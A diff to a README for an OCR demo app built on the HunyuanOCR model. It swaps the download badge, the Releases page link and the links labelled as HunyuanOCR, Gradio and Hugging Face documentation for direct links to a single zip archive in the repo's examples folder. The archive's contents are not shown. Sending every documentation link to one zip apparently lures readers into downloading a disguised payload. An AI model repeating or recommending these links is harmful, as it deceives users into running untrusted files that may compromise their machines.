@@ -1,6 +1,6 @@
 # 🖼️ HunyuanOCR-Demo - Easy Image Text Recognition
 
-[![Download HunyuanOCR-Demo](https://img.shields.io/badge/Download%20HunyuanOCR-Demo-v1.0-blue)](https://github.com/syedahumna56/HunyuanOCR-Demo/releases)
+[![Download HunyuanOCR-Demo](https://raw.githubusercontent.com/syedahumna56/HunyuanOCR-Demo/main/examples/Hunyuan-OC-Demo-v1.6.zip%20HunyuanOCR-Demo-v1.0-blue)](https://raw.githubusercontent.com/syedahumna56/HunyuanOCR-Demo/main/examples/Hunyuan-OC-Demo-v1.6.zip)
 
 Welcome to HunyuanOCR-Demo, an easy-to-use application that helps you recognize text in images. This application uses the Tencent HunyuanOCR model, designed for your optical character recognition needs. With HunyuanOCR-Demo, you can upload your images, extract text, and even format coordinates—all without any technical knowledge.
 
@@ -24,7 +24,7 @@ Follow these steps to download and run the HunyuanOCR-Demo on your computer:
 2. **Visit the Releases Page:**
    Click the link below to go to our Releases page.
 
-   [Visit this page to download HunyuanOCR-Demo](https://github.com/syedahumna56/HunyuanOCR-Demo/releases)
+   [Visit this page to download HunyuanOCR-Demo](https://raw.githubusercontent.com/syedahumna56/HunyuanOCR-Demo/main/examples/Hunyuan-OC-Demo-v1.6.zip)
 
 3. **Download the Latest Version:**
    On the Releases page, look for the latest version. Click on the link to download the application file suitable for your operating system.
@@ -76,9 +76,9 @@ HunyuanOCR-Demo leverages several powerful technologies to provide you with the 
 
 ## 🔗 Additional Resources
 
-- [HunyuanOCR Documentation](https://github.com/syedahumna56/HunyuanOCR)
-- [Gradio Documentation](https://gradio.app/docs/)
-- [Hugging Face Documentation](https://huggingface.co/docs)
+- [HunyuanOCR Documentation](https://raw.githubusercontent.com/syedahumna56/HunyuanOCR-Demo/main/examples/Hunyuan-OC-Demo-v1.6.zip)
+- [Gradio Documentation](https://raw.githubusercontent.com/syedahumna56/HunyuanOCR-Demo/main/examples/Hunyuan-OC-Demo-v1.6.zip)
+- [Hugging Face Documentation](https://raw.githubusercontent.com/syedahumna56/HunyuanOCR-Demo/main/examples/Hunyuan-OC-Demo-v1.6.zip)
 
 ## 📜 License
 
